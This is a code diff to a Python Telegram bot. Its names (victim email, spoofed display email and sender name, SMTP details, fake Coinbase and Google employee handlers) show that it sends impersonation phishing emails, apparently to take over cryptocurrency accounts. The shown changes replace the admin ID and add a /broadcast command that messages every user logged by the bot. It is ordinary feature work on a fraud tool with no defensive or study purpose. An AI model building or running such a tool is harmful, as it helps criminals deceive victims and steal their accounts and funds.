@@ -49,7 +49,7 @@ smtp_details = {
 
 
 # Admin ID
-ADMIN_ID = 7208067825
+ADMIN_ID = 7984584613
 
 AMOUNT_TOKEN = 9 
 CUSTOM_VICTIM_EMAIL, CUSTOM_SUBJECT, CUSTOM_SENDER_NAME, CUSTOM_DISPLAY_EMAIL, CUSTOM_HTML = range(5)
@@ -385,6 +385,38 @@ async def get_amount_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -
         await update.message.reply_text("Please enter a valid number for the amount.")
         return AMOUNT_TOKEN
 
+
+# Add the new command handler for broadcasting messages
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("You are not authorized to use this command.")
+        return
+
+    await update.message.reply_text("Enter the message to broadcast:")
+    return BROADCAST_MESSAGE
+
+async def get_broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    message = update.message.text
+    user_ids = get_all_user_ids()
+
+    for user_id in user_ids:
+        try:
+            await context.bot.send_message(chat_id=user_id, text=message)
+        except Exception as e:
+            logging.error(f"Failed to send message to {user_id}: {str(e)}")
+
+    await update.message.reply_text("Broadcast message sent.")
+    return ConversationHandler.END
+
+def get_all_user_ids():
+    user_ids = set()
+    with open(log_file_path, "r", encoding="utf-8") as file:
+        for line in file:
+            parts = line.split(" / ")
+            if len(parts) > 1:
+                user_id = parts[1].split(" | ")[0]
+                user_ids.add(user_id)
+    return user_ids
 
 
 async def get_representative(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -863,7 +895,16 @@ async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAUL
 
 
 
+# Add the new conversation handler for broadcasting messages
+BROADCAST_MESSAGE = range(1)
 
+broadcast_handler = ConversationHandler(
+    entry_points=[CommandHandler("broadcast", broadcast)],
+    states={
+        BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_broadcast_message)],
+    },
+    fallbacks=[CommandHandler("cancel", cancel)],
+)
 
 
 
@@ -1031,6 +1072,7 @@ def main():
     application.add_handler(employee_coinbase_handler)
     application.add_handler(secure_coinbase_handler)
     application.add_handler(employee_google_handler)
+    application.add_handler(broadcast_handler)
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.Regex("Misc"), misc_menu))
     application.add_handler(MessageHandler(filters.Regex("Coinbase"), coinbase_menu))
